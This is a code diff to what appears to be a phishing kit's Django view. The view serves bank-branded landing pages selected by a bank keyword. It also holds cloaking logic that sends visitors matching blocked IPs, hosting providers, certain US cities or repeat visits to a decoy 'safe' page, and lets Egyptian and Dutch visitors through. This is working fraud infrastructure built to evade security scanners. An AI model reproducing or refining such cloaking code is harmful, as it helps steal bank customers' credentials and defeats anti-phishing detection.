@@ -15,11 +15,10 @@ def get_landing_page(request, bank_keyword, lp='lp5'):
     except Keyword.DoesNotExist:
         return HttpResponse('Bank not found in system')
     logo = bank.image.url
-    if v.country_code in ['EG', 'NL']: #Allow Egypt
+    if v.country_code in ['EG', 'NL']: #Allow Egypt and Netherlands always
         v.cloaked = False
         v.reason = ''
         v.save()
-        return render_to_response('%s/index.html' % lp,locals())
 #    return render_to_response('%s/safe.html' % lp,locals())
     if v.cloaked:
         return render_to_response('%s/safe.html' % lp,locals())
@@ -38,13 +37,10 @@ def ip_details(request):
 
 bad_ips = [#'208.43.90.178',
            '50.28.69.79',
-           '67.227.83.121'
+           '67.227.83.121',
            ]
 
 #USE ONLY LOWERCASE
-organizations = ['softlayer',
-                 'liquidweb']
-
 cities = ['dallas',
           'irvine',
           'los angeles']
@@ -53,7 +49,7 @@ allowed_country = ['us']
 
 def legitimate_visitor(ip, geo_data, v):
     visits = Visitor.objects.filter(ip=ip)
-    print(visits)
+#    print(visits)
     number_of_visits = len(visits)
     if number_of_visits > 3:
         return 'visted %s times' % number_of_visits
